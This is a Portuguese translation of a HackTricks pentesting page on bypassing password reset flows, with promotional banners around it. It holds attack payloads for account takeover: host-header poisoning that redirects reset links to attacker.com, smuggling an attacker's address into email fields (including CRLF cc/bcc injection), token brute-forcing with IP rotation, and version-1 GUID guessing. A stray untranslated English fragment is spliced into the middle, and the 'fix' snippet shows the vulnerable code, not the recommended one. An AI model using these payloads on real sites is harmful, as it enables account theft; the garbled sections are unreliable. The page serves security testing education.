# Bypass de Redefini√ß√£o/Esquecimento de Senha

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novos programas de recompensa por bugs

üí¨ Participe de discuss√µes na comunidade

As seguintes t√©cnicas de recompila√ß√£o foram retiradas de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Vazamento de Token de Redefini√ß√£o de Senha Via Referer

O **HTTP referer** √© um campo de cabe√ßalho HTTP opcional que identifica o endere√ßo da p√°gina da web que est√° vinculada ao recurso sendo solicitado. O cabe√ßalho de solicita√ß√£o Referer cont√©m o endere√ßo da p√°gina da web anterior a partir da qual um link para a p√°gina atualmente solicitada foi seguido.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Explora√ß√£o

* Solicite a redefini√ß√£o de senha para o seu endere√ßo de e-mail
* Clique no link de redefini√ß√£o de senha
* N√£o altere a senha
* Clique em qualquer site de terceiros (por exemplo: Facebook, Twitter)
* Interceptar a solicita√ß√£o no proxy do burpsuite
* Verifique se o cabe√ßalho referer est√° vazando o token de redefini√ß√£o de senha.

### Impacto

Isso permite que a pessoa que tem o controle de um site espec√≠fico altere a senha do usu√°rio (ataque CSRF), porque essa pessoa conhece o token de redefini√ß√£o de senha do usu√°rio.

### Refer√™ncia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamento de Redefini√ß√£o de Senha

Se voc√™ encontrar um ataque de cabe√ßalho de host e estiver fora do escopo, tente encontrar o bot√£o de redefini√ß√£o de senha!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Explora√ß√£o

* Interceptar a solicita√ß√£o de redefini√ß√£o de senha no Burpsuite
* Adicione o seguinte cabe√ßalho ou edite o cabe√ßalho no burpsuite (tente um por um)
```
Host: attacker.com
```

```
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```
 Host: target.com
 Host: attacker.com
```
* Verifique se o link para alterar a senha dentro do e-mail est√° apontando para attacker.com

### Corre√ß√£o

Use `$_SERVER['SERVER_NAME']` em vez de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

A v√≠tima receber√° o link malicioso em seu e-mail e, ao clicar, vazar√° o link/token de redefini√ß√£o de senha do usu√°rio para o atacante, levando √† tomada completa da conta.

### Refer√™ncia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Redefini√ß√£o de senha manipulando o par√¢metro de e-mail

### Explora√ß√£o

* Adicione o e-mail do atacante como segundo par√¢metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Adicione o email do atacante como segundo par√¢metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro no array json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### Refer√™ncia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Alterando o Email e a Senha de Qualquer Usu√°rio por meio de Par√¢metros da API

### Explora√ß√£o

* O atacante deve fazer login em sua conta e ir para a fun√ß√£o de altera√ß√£o de senha
* Inicie o Burp Suite e intercepte a solicita√ß√£o
* Ap√≥s interceptar a solicita√ß√£o, envie-a para o repetidor e modifique os par√¢metros Email e Password
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### Refer√™ncia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sem Limite de Taxa: Bombardeio de E-mails <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Explora√ß√£o

* Inicie o Burp Suite e intercepte a solicita√ß√£o de redefini√ß√£o de senha
* Envie para o intruder
* Use carga √∫til nula

### Refer√™ncia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra como o Token de Redefini√ß√£o de Senha √© Gerado

Descubra o padr√£o do token de redefini√ß√£o de senha

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Se ele for

* Gerado com base no Timestamp
* Gerado com base no UserID
* Gerado com base no e-mail do usu√°rio
* Gerado com base no nome e sobrenome
* Gerado com base na data de nascimento
* Gerado com base em criptografia

Use o Burp Sequencer para encontrar a aleatoriedade ou previsibilidade dos tokens.

## GUID Adivinh√°vel

Existem diferentes tipos de GUIDs:

* **Vers√£o 0:** Apenas visto no GUID nulo ("00000000-0000-0000-0000-000000000000").
* **Vers√£o 1:** O GUID √© gerado de maneira previs√≠vel com base em:
  * O tempo atual
  * Uma "sequ√™ncia de rel√≥gio" gerada aleatoriamente que permanece constante entre GUIDs durante o tempo de atividade do sistema gerador
  * Um "ID de n√≥", que √© gerado com base no endere√ßo MAC do sistema se estiver dispon√≠vel
* **Vers√£o 3:** O GUID √© gerado usando um hash MD5 de um nome e namespace fornecidos.
* **Vers√£o 4:** O GUID √© gerado aleatoriamente.
* **Vers√£o 5:** O GUID √© gerado usando um hash SHA1 de um nome e namespace fornecidos.

√â poss√≠vel dar uma olhada em um GUID e descobrir sua vers√£o, h√° uma pequena ferramenta para isso: [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Se a vers√£o utilizada para gerar um GUID de redefini√ß√£o de senha for a vers√£o 1, √© poss√≠vel realizar um ataque de for√ßa bruta nos GUIDs:
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### Refer√™ncias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipula√ß√£o de resposta: Substituir uma resposta ruim por uma boa

Procure por solicita√ß√µes e respostas como estas
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
# Reset Password

## Description
This page will describe some techniques to reset passwords in different scenarios.

## Change Response
## Descri√ß√£o
Esta p√°gina descrever√° algumas t√©cnicas para redefinir senhas em diferentes cen√°rios.
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### Refer√™ncia

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Usando Token Expirado <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Verifique se o token expirado pode ser reutilizado.

### For√ßa Bruta no Token de Redefini√ß√£o de Senha <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Tente fazer for√ßa bruta no token de redefini√ß√£o de senha usando o Burpsuite.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Use o IP-Rotator no burpsuite para burlar o limite de taxa baseado em IP.

### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Tente Usar Seu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Tente adicionar o token de redefini√ß√£o de senha com a conta da v√≠tima.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalida√ß√£o de Sess√£o no Logout/Reset de Senha

Quando um usu√°rio faz **logout ou reseta sua senha**, a sess√£o atual deve ser invalidada.\
Portanto, **capture os cookies** enquanto o usu√°rio est√° logado, fa√ßa **logout** e **verifique** se os **cookies** ainda est√£o **v√°lidos**.\
Repita o processo **alterando a senha** em vez de fazer logout.

## Tempo de Expira√ß√£o do Token de Reset

Os **tokens de reset devem ter um tempo de expira√ß√£o**, ap√≥s o qual o token n√£o deve ser v√°lido para alterar a senha de um usu√°rio.

## Verifica√ß√µes Extras

* Use username@burp\_collab.net e analise o retorno
* Usar carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* Senha longa (>200) leva a DoS
* Adicione um segundo par√¢metro de email e valor

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
